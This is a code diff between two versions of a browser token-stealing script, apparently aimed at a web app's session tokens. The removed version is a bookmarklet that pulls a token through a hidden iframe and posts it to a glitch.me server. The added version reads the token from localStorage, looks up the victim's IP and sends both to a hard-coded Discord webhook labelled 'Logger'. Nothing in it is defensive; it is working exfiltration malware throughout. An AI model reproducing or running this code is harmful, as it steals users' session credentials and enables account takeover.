@@ -1,61 +1,53 @@
-javascript:(function(){
 
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
+    const token = localStorage.getItem('token');
+    const webhookURL = 'https://discord.com/api/webhooks/1391045636366930000/fH5K6z2KNgUe9ykdh9UZjfiNRKvoV6DYOy3TzITTQC8_KuYUteGBE40Cj-IFy2cQsVgM';
 
-    const token = iframe.contentWindow.localStorage.getItem('token') || 
-                 iframe.contentDocument.cookie.match(/token=([^;]+)/)?.[1];
-    
-    if (!token) {
-        document.body.removeChild(iframe);
-        return;
-    }
+    function sendToDiscord(token, ip) {
+        const embed = {
+            title: "🔐 Token & 🌐 IP Info",
+            color: 0x00FFFF,
+            fields: [
+                {
+                    name: "Token",
+                    value: `\`\`\`${token}\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "IP Address",
+                    value: `\`\`\`${ip}\`\`\``,
+                    inline: false
+                }
+            ],
+            footer: {
+                text: "Logger by HaThu fucked one ppl success",
+            },
+            timestamp: new Date().toISOString()
+        };
 
-    const SERVER_URL = 'https://serious-mysterious-albertonykus.glitch.me';
-
-    function sendData(data) {
-
-        fetch(`${SERVER_URL}/log`, {
+        fetch(webhookURL, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(data)
-        }).catch(() => {
-
-            const form = document.createElement('form');
-            form.action = `${SERVER_URL}/log`;
-            form.method = 'POST';
-            form.target = '_blank';
-            
-            const input = document.createElement('input');
-            input.name = 'data';
-            input.value = btoa(JSON.stringify(data));
-            form.appendChild(input);
-            
-            document.body.appendChild(form);
-            form.submit();
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                username: "Logger Bot",
+                avatar_url: "https://i.imgur.com/Jxee3pS.jpeg",
+                embeds: [embed]
+            })
         });
     }
 
-    fetch('https://api.ipify.org?format=json')
-        .then(r => r.json())
-        .then(ipData => {
-            sendData({
-                token: token.slice(0, 50),
-                ip: ipData.ip,
-                ua: navigator.userAgent,
-                url: window.location.href
+    if (token) {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ip = data.ip;
+                sendToDiscord(token, ip);
+            })
+            .catch(error => {
+                console.error('Could not fetch IP:', error);
+                sendToDiscord(token, 'Unknown');
             });
-        })
-        .catch(() => {
-            sendData({
-                token: token.slice(0, 50),
-                ip: 'Unknown',
-                ua: navigator.userAgent,
-                url: window.location.href
-            });
-        })
-        .finally(() => {
-            document.body.removeChild(iframe);
-        });
-})();
+
+    } else {
+    }
